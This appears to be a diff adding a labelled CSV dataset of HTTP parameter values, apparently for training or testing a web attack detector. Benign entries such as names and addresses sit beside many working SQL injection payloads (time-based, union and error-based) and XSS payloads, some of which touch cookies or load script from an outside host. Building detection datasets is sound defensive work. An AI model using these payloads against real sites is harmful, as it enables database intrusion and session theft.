@@ -1,0 +1,73 @@
+﻿class,value,family,template,source,commit,record
+normal,saprtich@seramitex.sv,,external:6914,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,6914
+normal,karkotsk,,external:25675,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,25675
+normal,muente monfulle,,external:5270,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,5270
+normal,siddell,,external:19290,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,19290
+normal,a79ga44,,external:17804,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,17804
+normal,camisoln,,external:2941,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,2941
+normal,g53on3a9u56,,external:17516,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,17516
+normal,17256,,external:20763,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,20763
+normal,innota,,external:17399,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,17399
+normal,ji-chuu,,external:5133,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,5133
+normal,alargamiento,,external:2529,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,2529
+normal,"calle ter, 20,",,external:26570,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,26570
+normal,822rrac106,,external:5372,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,5372
+normal,"aljaraque 196, 11d",,external:8123,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,8123
+normal,amalie,,external:9241,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,9241
+normal,4248,,external:21086,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,21086
+normal,15398407e,,external:2058,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,2058
+normal,6503452667221524,,external:24100,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,24100
+normal,gormaz schneider,,external:24244,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,24244
+normal,4973,,external:26321,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,26321
+normal,7661,,external:1993,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,1993
+normal,kitaen5@lawn.vn,,external:25363,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,25363
+normal,ajoy,,external:20989,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,20989
+normal,ladn,,external:19223,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,19223
+sqli,"1'+(select eztr where 4260=4260 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5))+'",,external:12852,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,12852
+sqli,"1"") and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (""liar""=""liar",,external:13916,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,13916
+sqli,"1"")) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",,external:16627,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,16627
+sqli,1')));select case when 2948=7279 then 1 else null end--,,external:10457,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,10457
+sqli,"1%' procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",,external:13344,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,13344
+sqli,"1"")) as sqow where 8752=8752;select (case when (1726=4080) then 1726 else 1/(select 0) end)--",,external:28574,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,28574
+sqli,"1) where 6340=6340 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",,external:27215,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,27215
+sqli,"1'))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('qtni'='qtni",,external:13815,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,13815
+sqli,1') as jxtg where 1071=1071 and sleep(5)--,,external:15503,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,15503
+sqli,"1')) union all select null,null,null#",,external:12420,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,12420
+sqli,-3359' order by 1--,,external:16058,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,16058
+sqli,1')));begin user_lock.sleep(5); end and ((('hglq' like 'hglq,,external:13015,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,13015
+sqli,"1%"");select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (""%""=""",,external:13644,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,13644
+sqli,"1"")) union all select null#",,external:15669,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,15669
+sqli,"1 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)# miji",,external:13857,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,13857
+sqli,1')));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,,external:30531,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,30531
+sqli,"1')));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('jxqf' like 'jxqf",,external:12129,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,12129
+sqli,"1) as xuvz where 3061=3061 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",,external:14226,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,14226
+sqli,"-4091""))) union all select 6694,6694--",,external:16272,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,16272
+sqli,"1"") and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (""zyeo"" like ""zyeo",,external:12886,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,12886
+sqli,"elt(5098=2728,1)",,external:16429,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,16429
+sqli,-3982)) or 6872=6872 and ((6331=6331,,external:16022,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,16022
+sqli,"1)) as xsyk where 2575=2575 or 8156=(select count(*) from generate_series(1,5000000))--",,external:14942,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,14942
+sqli,"1) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))",,external:28386,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,28386
+xss,"""javascript:alert(2)"">",,external:30618,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,30618
+xss,<img id=xss src=&{alert('xss');};>,,external:30985,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,30985
+xss,width:1px;filter:glow onfilterchange=alert(1)>x</div>,,external:30656,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,30656
+xss,<style>@im\\port'\\ja asc ipt:document.cookie=true';</style>,,external:30699,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,30699
+xss,""" onblur=alert(xss) ""> <""",,external:31015,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,31015
+xss,<img src=&{document.cookie=true;};>,,external:30719,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,30719
+xss,"'""""><script language=""javascript""> alert('x s s');</script>",,external:31020,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,31020
+xss,<<script>document.cookie=true;</script>,,external:30730,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,30730
+xss,"<script src=""http://vulnerability-lab.com/crosssitescripting.jpg""></script>",,external:30575,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,30575
+xss,<style><!--</style><script>document.cookie=true;//--></script>,,external:30729,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,30729
+xss,"<table background=""javascript:alert('xss')"">",,external:30955,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,30955
+xss,"data:text/html, type=image>",,external:30624,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,30624
+xss,![cdata[<!--]]<script>alert('xss');//--></script>,,external:30990,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,30990
+xss,"<!--<value><![cdata[<xml id=i><x><c><![cdata[<img id=xss src=""javas<![cdata[cript:alert('xss');"">",,external:31058,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,31058
+xss,"<img src=""http://www.vulnerability-lab.com/file.php?variables=malicious"">",,external:30577,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,30577
+xss,"<style>li {list-style-image: url(""javascript:alert('xss')"");}</style><ul><li>xss",,external:31018,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,31018
+xss,"<body background=""javascript:document.cookie=true;"">",,external:30683,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,30683
+xss,"<script>alert(""crosssitescripting"")</script>"";' >",,external:30893,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,30893
+xss,"<img style=""xss:expr/*xss*/ession(alert('xss'))"">",,external:31052,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,31052
+xss,"<video id=xss poster=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))//",,external:31004,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,31004
+xss,-1<body onload=document.cookie=true;>,,external:30816,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,30816
+xss,-1<img src=&{document.cookie=true;};>,,external:30851,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,30851
+xss,">""<img src=""mocha:document.cookie=true;"">",,external:29507,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,29507
+xss,mhtml:http://html5sec.org/test.html!xss.html></iframe>,,external:30657,httpParamsDataset,926670a710283f87c05b554680facf3f9530548c,30657
